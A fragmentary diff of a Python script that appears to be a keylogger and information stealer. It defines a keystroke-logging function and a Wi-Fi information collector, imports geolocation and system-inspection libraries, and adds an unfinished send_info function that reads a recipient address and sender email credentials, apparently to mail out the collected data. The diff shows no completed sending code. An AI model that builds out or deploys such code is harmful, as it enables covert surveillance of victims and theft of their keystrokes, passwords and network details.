@@ -12,6 +12,7 @@ import platform
 import subprocess
 import geocoder
 import socket,re,uuid,psutil,logging
+
 system = platform.system()
 
 def log_keystroke(key):
@@ -61,8 +62,12 @@ def get_wifi_info():
         except IndexError:
             wifi_info_list.append("{:<30}|  {:<}".format(i, ""))
 
-    
+    def send_info():
+        email = data["info_email"]
+        email_address = data["sender_email_address"]
+        email_password = data["sender_email_password"]
 
+      
     
     
     
